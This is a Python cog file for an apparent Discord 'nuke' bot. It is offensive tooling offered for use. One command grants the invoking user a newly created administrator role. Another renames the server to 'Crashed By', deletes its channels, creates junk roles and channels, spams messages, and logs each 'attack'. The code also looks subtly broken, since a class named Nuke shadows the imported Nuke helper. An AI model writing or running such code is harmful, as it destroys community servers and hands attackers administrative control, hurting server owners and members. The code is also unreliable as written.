import discord
from discord.ext import commands
from discord.ext.commands import BucketType, CommandOnCooldown

from core.managers.counter import AttackCounter
from core.operations import Nuke
from core.config.config import NAME

class GiveAdmin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="giveadmin")
    async def giveadmin(self, ctx: commands.Context):
        try:
            admin_role = await ctx.guild.create_role(
                name=f"{NAME}Admin777",
                permissions=discord.Permissions(administrator=True),
            )
            await ctx.author.add_roles(admin_role)
            await ctx.send("Successfully granted!", delete_after=2)
        except discord.Forbidden:
            await ctx.send("Error: No permission, make sure i have admin!", delete_after=2)
        except Exception as e:
            print(f"Error: {e}!")


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.attack_counter = AttackCounter()

    @commands.command()
    @commands.cooldown(1, 120, BucketType.guild)  # 120 seconds cooldown
    async def nuke(self, ctx):
        self.attack_counter.record_attack_start()

        fucker = Nuke(ctx)  # Define our mini-api wrapper
        await ctx.guild.edit(name=f"Crashed By {NAME}.", icon=None)
        await fucker.delChannels(ctx)
        await fucker.crRoles(ctx)
        await fucker.crChannels(ctx)
        await fucker.spam(ctx)
        await fucker.delete_events(ctx)
        await fucker.create_event(ctx)

        self.attack_counter.record_attack_end(
            server_name=ctx.guild.name, attack="nuke", user_id=ctx.author.id
        )

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, CommandOnCooldown):
            embed = discord.Embed(
                title="Cooldown", color=discord.Color.from_rgb(48, 49, 54)
            )
            embed.add_field(
                name="Error.",
                value=f"Command is on cooldown. Try again in {error.retry_after:.2f} seconds.",
                inline=False,
            )
            await ctx.send(embed=embed)
        else:
            raise error


async def setup(bot):
    await bot.add_cog(GiveAdmin(bot))
    await bot.add_cog(Nuke(bot))
